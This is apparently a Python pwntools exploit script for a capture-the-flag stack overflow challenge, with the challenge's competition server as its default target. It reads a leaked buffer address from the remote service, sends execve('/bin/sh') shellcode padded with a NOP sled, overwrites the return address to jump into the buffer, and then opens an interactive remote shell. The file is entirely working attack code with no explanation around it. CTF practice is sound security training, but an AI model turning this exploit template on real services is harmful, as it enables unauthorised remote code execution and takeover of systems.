#!/usr/bin/env python3
from pwn import *
import re


def build_payload(buf_addr: int) -> bytes:
    context.clear(arch='amd64', os='linux')
    shellcode = asm(shellcraft.execve('/bin/sh', 0, 0))

    if len(shellcode) > 128:
        raise ValueError(f'Shellcode too large for buffer: {len(shellcode)} bytes')

    padding_to_buf = b"\x90" * (128 - len(shellcode))  # NOP sled
    saved_rbp = b"B" * 8
    ret_addr = p64(buf_addr)

    return shellcode + padding_to_buf + saved_rbp + ret_addr


def exploit(host: str, port: int):
    io = remote(host, port)

    # Expect a line like: "buf: 0x7ffd..."
    line = io.recvline(timeout=5)
    if not line:
        log.failure('No data received from server')
        return
    log.info(line.decode(errors='ignore').strip())

    m = re.search(rb"buf:\s*(0x[0-9a-fA-F]+)", line)
    if not m:
        log.failure('Failed to parse buffer address')
        return

    buf_addr = int(m.group(1), 16)
    log.success(f'Leaked buffer address: {hex(buf_addr)}')

    payload = build_payload(buf_addr)
    log.info(f'Payload length: {len(payload)}')

    # Send raw payload followed by a newline to terminate fgets
    io.send(payload + b"\n")

    # If successful, we should have a shell
    io.interactive()


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='Exploit for challenge-11 stack overflow')
    parser.add_argument('--host', default='pwn-stacked.purple.ctfcompetition.com')
    parser.add_argument('--port', type=int, default=1337)
    args = parser.parse_args()

    exploit(args.host, args.port)


